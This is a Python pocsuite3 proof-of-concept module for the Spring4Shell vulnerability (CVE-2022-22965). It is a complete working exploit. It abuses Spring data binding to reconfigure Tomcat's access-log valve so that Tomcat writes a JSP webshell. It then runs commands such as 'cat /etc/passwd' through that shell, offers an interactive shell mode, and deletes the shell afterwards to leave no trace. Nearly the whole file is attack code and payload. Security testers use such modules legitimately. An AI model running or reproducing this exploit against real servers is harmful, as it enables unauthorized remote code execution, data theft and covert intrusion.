#!/usr/bin/env python3
"""
CVE-2022-22965 - Spring4Shell (Spring Core) Remote Code Execution

pocsuite3 PoC. Detects and exploits Spring4Shell via the *verified afrog*
GET-mutation technique:

  1. GET ?class.module.classLoader.resources.context.parent.pipeline.first.*
     reconfigures Tomcat's AccessLogValve so it writes a JSP webshell
     ({shell}.jsp) into webapps/ROOT.
  2. GET /{shell}.jsp?pwd=j&cmd=<cmd> runs the command via Runtime.exec and
     echoes the output.
  3. Cleanup deletes {shell}.jsp (不留痕).

This GET-based approach is more reliable than the fscan-style POST variant.

Affected: Spring Framework <= 5.3.17 / 5.2.19, JDK 9+, deployed as a WAR on
Tomcat. Spring Boot executable-JAR deployments are NOT vulnerable.

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2022-22965
  - afrog verified PoC: https://github.com/zan8in/afrog-pocs/blob/main/CVE/2022/CVE-2022-22965.yaml
  - https://tanzu.vmware.com/security/cve-2022-22965

NOTE: the dropped shell calls Runtime.exec(cmd) directly, so `cmd` is
whitespace-tokenised by Java — NO shell quoting, pipes, or redirects. Keep
commands to simple tokens (e.g. `id`, `cat /etc/passwd`, `whoami`).

Cleanup (不留痕) is mandatory: every mode (_verify / _attack / _shell) drops a
JSP webshell and deletes it before returning, enforced in finally blocks.
"""

import re
import time
import secrets
import string
import urllib.parse
from collections import OrderedDict

from pocsuite3.api import (
    Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY
)
from pocsuite3.lib.core.interpreter_option import OptString


def randstr(n: int = 8) -> str:
    """Random lowercase+digits filename for the dropped webshell (afrog: randomLowercase(8))."""
    return "".join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(n))


# Tomcat AccessLogValve pattern. Once set, Tomcat writes a JSP webshell.
# %{c2}i / %{c1}i / %{suffix}i are interpolated from request headers c2/c1/suffix.
# URL-encoded exactly as in the verified afrog PoC (do not "clean" it up).
ACCESS_LOG_PATTERN = (
    "%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B"
    "%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec("
    "request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B"
    "%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)"
    "%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di"
)

# /etc/passwd signature (afrog verified matcher): root:x:0:0:
PASSWD_RE = re.compile(rb"root:.*?:[0-9]*:[0-9]*:")


class CVE202222965POC(POCBase):
    """Spring4Shell (CVE-2022-22965) RCE — afrog GET-mutation technique."""

    pocInfo = {
        'name': 'CVE-2022-22965 Spring4Shell RCE',
        'vulID': 'CVE-2022-22965',
        'author': 'RBKD-SEC',
        'vulType': VUL_TYPE.CODE_EXECUTION,
        'category': POC_CATEGORY.EXPLOITS.WEBAPP,
        'version': '1.0',
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2022-22965',
            'https://github.com/zan8in/afrog-pocs/blob/main/CVE/2022/CVE-2022-22965.yaml',
            'https://tanzu.vmware.com/security/cve-2022-22965',
            'https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/',
        ],
        'appName': 'Spring Framework',
        'appVersion': '<= 5.3.17 / 5.2.19 (JDK 9+, WAR on Tomcat)',
        'desc': '''
            Spring4Shell (CVE-2022-22965): Spring MVC data-binding abuse on JDK 9+
            when deployed as a WAR on Tomcat. Reuses the verified afrog GET-mutation
            technique: reconfigure Tomcat's AccessLogValve via
            class.module.classLoader.resources.context.parent.pipeline.first.* to
            write a JSP webshell into webapps/ROOT, then execute commands through it.
            The webshell is always deleted afterwards (不留痕).
        ''',
        'install_requires': ['requests>=2.20.0'],
    }

    def __init__(self):
        super(CVE202222965POC, self).__init__()
        self.session = None
        self.shell_name = None  # name of the dropped {shell_name}.jsp

    def _options(self):
        opt = OrderedDict()
        opt["command"] = OptString(
            "whoami",
            description="Command for _attack (Runtime.exec tokenised: no shell pipes/quotes/redirects)",
            require=False
        )
        return opt

    # ------------------------------------------------------------------ helpers
    def _init_session(self):
        if not self.session:
            self.session = requests.Session()
            self.session.headers.update({"User-Agent": "Mozilla/5.0"})

    def _drop_shell(self) -> bool:
        """Step 1: GET mutation -> reconfigure AccessLogValve -> writes {shell}.jsp."""
        self.shell_name = randstr(8)
        base = self.url.rstrip("/")
        params = (
            "?class.module.classLoader.resources.context.parent.pipeline.first.pattern="
            + ACCESS_LOG_PATTERN
            + "&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
            + "&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT"
            + "&class.module.classLoader.resources.context.parent.pipeline.first.prefix="
            + self.shell_name
            + "&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
        )
        # Tomcat interpolates these header values into the %{...}i placeholders of the pattern:
        #   c2 -> "<%"   c1 -> "Runtime"   suffix -> "%>//"
        headers = {
            "suffix": "%>//",
            "c1": "Runtime",
            "c2": "<%",
            "DNT": "1",
        }
        # 2-byte body (Content-Length: 2), matching the verified afrog request.
        resp = self.session.get(base + "/" + params, headers=headers, data="xx", timeout=15)
        return resp.status_code == 200

    def _exec(self, command: str):
        """Step 2: execute a command via the dropped webshell. Returns body bytes or None."""
        base = self.url.rstrip("/")
        url = "{}/{}.jsp?pwd=j&cmd={}".format(base, self.shell_name, urllib.parse.quote(command))
        for attempt in range(2):  # allow AccessLogValve a moment to flush the file
            try:
                resp = self.session.get(url, timeout=20)
                if resp.status_code == 200 and resp.content:
                    return resp.content
            except Exception as e:  # noqa
                logger.debug("exec request error: %s" % str(e))
            if attempt == 0:
                time.sleep(1.0)
        return None

    def _cleanup(self):
        """Delete the dropped webshell (不留痕). Best-effort, never raises."""
        if not self.shell_name:
            return
        try:
            # find by the unique random name and delete; Runtime.exec-tokenisation safe
            # (whitespace-free tokens, no shell quoting / glob / redirection needed).
            self._exec("find / -name %s.jsp -delete" % self.shell_name)
            # confirm removal (expect 404)
            base = self.url.rstrip("/")
            check = self.session.get("{}/{}.jsp".format(base, self.shell_name), timeout=8)
            if check.status_code == 404:
                logger.info("cleanup ok: %s.jsp removed" % self.shell_name)
            else:
                logger.warning("cleanup check status=%s for %s.jsp — manual removal advised"
                               % (check.status_code, self.shell_name))
        except Exception as e:  # noqa
            logger.warning("cleanup error (manual removal advised): %s" % str(e))

    # --------------------------------------------------------------------- modes
    def _verify(self):
        """Verify: drop shell, echo /etc/passwd, prove via root:.*?:[0-9]*:[0-9]*:"""
        output = Output(self)
        self._init_session()
        try:
            if not self._drop_shell():
                output.fail("AccessLogValve mutation did not return HTTP 200; target likely not vulnerable")
                return output
            content = self._exec("cat /etc/passwd")
            if content and PASSWD_RE.search(content):
                text = content.decode("utf-8", "ignore")
                logger.info("target is vulnerable to CVE-2022-22965")
                result = {
                    'VerifyInfo': {
                        'URL': self.url,
                        'VulType': VUL_TYPE.CODE_EXECUTION,
                        'Payload': 'GET class.module.classLoader...pipeline.first -> %s.jsp -> cat /etc/passwd' % self.shell_name,
                    },
                    'Extra': {'evidence': text[:200] + ("..." if len(text) > 200 else "")},
                }
                output.success(result)
                return output
            output.fail("webshell dropped but /etc/passwd echo not observed (patched, non-Tomcat-WAR, or shell not flushed)")
            return output
        finally:
            self._cleanup()

    def _attack(self):
        """Attack: drop shell, execute the configured command, return output."""
        output = Output(self)
        self._init_session()
        command = self.get_option("command") or "whoami"
        try:
            if not self._drop_shell():
                output.fail("AccessLogValve mutation did not return HTTP 200; target likely not vulnerable")
                return output
            content = self._exec(command)
            if content is None:
                output.fail("failed to execute command: %s" % command)
                return output
            text = content.decode("utf-8", "ignore")
            logger.info("command executed: %s" % command)
            result = {
                'ShellInfo': {'URL': self.url, 'Command': command},
                'Extra': {'output': text[:500] + ("..." if len(text) > 500 else "")},
            }
            output.success(result)
            return output
        finally:
            self._cleanup()

    def _shell(self):
        """Interactive shell: drop shell once, loop commands, cleanup on exit."""
        self._init_session()
        if not self._drop_shell():
            logger.error("AccessLogValve mutation failed; cannot establish shell")
            return
        print("\n" + "=" * 60)
        print("Spring4Shell RCE shell - CVE-2022-22965 @ %s" % self.url)
        print("Runtime.exec tokenised: NO shell pipes/quotes/redirects.")
        print("type 'exit' to quit (webshell is auto-deleted).")
        print("=" * 60 + "\n")
        try:
            while True:
                try:
                    cmd = input("\033[91mspring4shell\033[0m@{}> ".format(self.rhost)).strip()
                except (EOFError, KeyboardInterrupt):
                    print("\nExiting shell...")
                    break
                if not cmd or cmd.lower() == "exit":
                    break
                content = self._exec(cmd)
                if content:
                    print(content.decode("utf-8", "ignore"))
                else:
                    logger.error("command returned no output: %s" % cmd)
        finally:
            self._cleanup()


register_poc(CVE202222965POC)
